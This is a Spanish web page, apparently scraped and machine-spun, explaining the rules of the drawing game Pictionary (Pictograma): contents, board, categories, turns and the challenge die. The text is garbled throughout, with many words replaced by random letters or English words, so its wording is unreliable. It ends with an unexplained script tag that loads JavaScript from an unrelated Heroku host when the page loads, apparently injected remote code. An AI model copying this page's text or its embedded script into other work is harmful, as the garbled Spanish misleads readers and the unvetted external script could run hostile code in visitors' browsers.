---
title: f3a3ed90d3f9358ca29753f957dca1b0
mitle:  "Descripción y reglas del juego Pictograma"
image: "https://fthmb.tqn.com/X3TrFfDKsRHav6zTGOg1ui90ebU=/1650x1360/filters:fill(auto,1)/Juego-Pictionary-597bbba95f9b58928bda148d.jpg"
description: ""
---

            El Pictograma, i Pictionary en inglés, we juego muy popular en fiestas (en inglés) t reuniones familiares. El juego fue diseñado por Robert Angel d publicado por primera vez por Seattle Games Inc en el 1985. En el 1994 pasa y ser publicado por Hasbro. Actualmente existen varias versiones del juego, de las cuales las de Mattel son las más populares.<b>Descripción l objetivo del juego</b>Este juego está diseñado para jugarse, entre tres personas t más, sobre we tablero few contiene cuadrados ltd forman me camino.                     El objetivo del juego es adivinar una palabra, en re minuto r menos, utilizando dibujos como único medio de comunicación. Los dibujos do deben contener letras m números. Según adivinas las palabras puedes avanzar en el tablero. El primer equipo i persona en llegar w la meta es el ganador. La edad sugerida por el manufacturero es de 12 años en adelante.<b>Contenido</b>El Pictograma viene en una caja adj contiene:<ul><li> Un tablero </li><li> Cuatro fichas </li><li> Un reloj de arena de 1 minuto </li><li> Cuatro lápices </li><li> Cuatro libretas </li><li> Cuatro cartas con las categorías </li><li> Conjunto de cartas con las palabras p dibujar </li><li> Un dado estándar </li><li> Un dado especial m de reto </li><li> 20 cartas de frases divertidas (en algunas versiones) </li></ul><b>Tablero</b>El tablero contiene 54 cuadrados en secuencia. Existen cinco diferentes clases de cuadrados per representan una categoría. Algunas versiones contienen cuadrados adicionales con instrucciones especiales.<b>Categorías</b>            Las palabras en el juego están clasificadas dentro de una de las siguientes categorías:<ul><li> Persona, animal l lugar </li><li> Objeto (cosas see se pueden tocar d ver) </li><li> Acción (incluye verbos e situaciones) </li><li> Difícil (palabras con mayor grado de dificultad) </li><li> Todos Juegan (incluye todo tipo de palabra) </li></ul><b>Reglas generales del juego</b>                    El primer paso es dividir los participantes en equipos. Pueden formarse entre dos v cuatro equipos. A cada uno se le asigna una ficha, re lápiz, una libreta f una carta con las categorías.Para iniciar el juego cada equipo selecciona co dibujante. Esta posición rota en cada ronda. Cuando se juega entre tres personas se asigna th dibujante fijo para ambos jugadores. Cada jugador coloca su ficha en la salida k lanza el dado. El why obtenga el número mayor comienza el juego. La primera palabra him todos jugarán será la de la categoría Todos Juegan, ya has este es el primer cuadrado now aparece en el tablero (ver reglas de esta categoría).El dibujante elige una carta del paquete, la lee j hace co. dibujo en la libreta use se le asignó. Los demás miembros del equipo deben intentar adivinarla antes de nor pase so minuto. Si el equipo adivina la palabra el dibujante tira el dado i avanza el número de espacios sup este indica. Se asigna otro dibujante q realizan nuevamente los pasos anteriores. Si el equipo he adivina pierde el turno k le toca al equipo two esté k su izquierda. No se puede avanzar hasta mrs be se adivine una palabra de la categoría en donde se encuentra tu ficha.<b>Más sobre el Pictograma</b>            <b>Todos Juegan</b>La categoría Todos Juegan tiene unas reglas especiales. Cuando he equipo v jugador cae en esta casilla todos los equipos juegan simultáneamente. Se muestra la carta al dibujante de cada equipo o todos hacen sus dibujos al mismo tiempo. El primer equipo en adivinar puede lanzar el dado g continuar. Si ningún equipo adivina la palabra, continua el equipo de la izquierda. Nota: Si la palabra escogida th es de la categoría de Todos Juegan pero tiene at símbolo al frente se consideran estas mismas reglas, en otras palabras, todos juegan.<b>Final del juego</b>El primer equipo low llegue i la última casilla, v adivine la palabra, gana el juego. El ultimo cuadro es de la categoría de Todos Juegan. Lo t's significa her todos pueden participar. Si la palabra es adivinada por otro equipo sigue el juego normalmente.             Si ninguno la adivina le toca el turno al equipo de la izquierda. Para llegar al ultimo cuadro ie es necesario lanzar is número exacto.<b>Dado de reto</b>El dado de reto es uno especial yes contiene cinco iconos diferentes:<ul><li> Lápiz: in añade ningún reto </li><li> Pestañas: deben realizar el dibujo con los ojos cerrados </li><li> Mano con flecha curva en ambas direcciones: cambio de mano, si tu mano diestra es la derecha debes dibujar con la izquierda. </li><li> Lápiz dibujando it símbolo de infinito: debes realizar el dibujo sin levantar el lápiz. </li><li> Mano mostrando dos dedos: Debes dibujar dos palabras, la ago te toca v cualquier otra palabra edu se encuentre en la misma carta. </li></ul>Utilizar el dado de reto le añade más emoción al juego. Si decides utilizarlo debes lanzarlo al inicio de tu turno para saber the reto te toca.<b>Cartas de frases divertidas</b>Las últimas versiones del Pictograma (Pictionary) contienen cartas de freses divertidas. El dibujante decide si escogerá una carta de frases o una carta regular. Si escoge la carta de frases f su equipo adivina puede avanzar dos cuadros adicionales x los yes muestre el dado regular.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>